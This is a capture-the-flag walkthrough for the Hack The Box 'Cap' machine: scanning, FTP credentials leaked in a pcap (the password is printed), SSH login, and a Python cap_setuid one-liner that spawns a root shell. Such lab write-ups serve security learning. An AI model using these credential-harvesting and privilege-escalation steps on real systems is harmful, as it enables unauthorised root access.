---
tags:
  - HTB
  - Linux
  - Easy
  - IDOR
  - Leakage
  - Capabilities
---
https://app.hackthebox.com/machines/Cap/
# Add Hosts

Append to the `/etc/hosts` file:

```text
10.10.10.245 cap.htb
```
# Scanning
```console
$ nmap -p21,22,80 -sV -sC cap.htb

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found http://cap.htb/data/0.pcap file which **leaked** some **credentials**:
```console
$ tcpdump -r 0.pcap | grep FTP

08:12:54.084642 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 1:14, ack 21, win 4106, length 13: FTP: USER nathan
08:12:54.084772 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.
08:12:55.383140 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!
08:12:55.390529 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 55:78, ack 36, win 502, length 23: FTP: 230 Login successful.
```
# Exploitation
Log in via SSH with **leaked credentials**:
```bash
ssh nathan@cap.htb
```
Get the **user flag**:
```bash
cat user.txt
```
# Post-Exploitation
Found `/usr/bin/python3.8` with **setuid capability**:
```console
$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
Spawn a **root shell** from Python:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Get the **root flag**:
```bash
cat /root/root.txt
```